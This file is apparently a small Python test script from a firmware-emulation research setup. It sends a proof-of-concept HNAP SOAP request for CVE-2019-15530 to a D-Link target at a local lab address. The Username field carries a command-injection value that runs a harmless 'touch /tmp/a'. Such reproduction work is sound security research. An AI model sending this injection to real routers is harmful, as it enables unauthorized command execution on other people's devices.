qemu-user-targets/CVE-2019-15530/tester.py

# Save this file in /Crucibile/analyses/fuzzer/tester.py
import fuzzer


payload = '''<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin' && touch /tmp/a #</Username><LoginPassword></LoginPassword><Captcha></Captcha><PrivateLogin>LoginPassword</PrivateLogin></Login></soap:Body></soap:Envelope>'''

fuzzer.TARGET = '172.17.0.2'
fuzzer.BRAND  = 'dlink'
x, y = fuzzer.send_hnap_dummy(80, '/HNAP1/SetWanSettings', data=payload)
print(x, y)
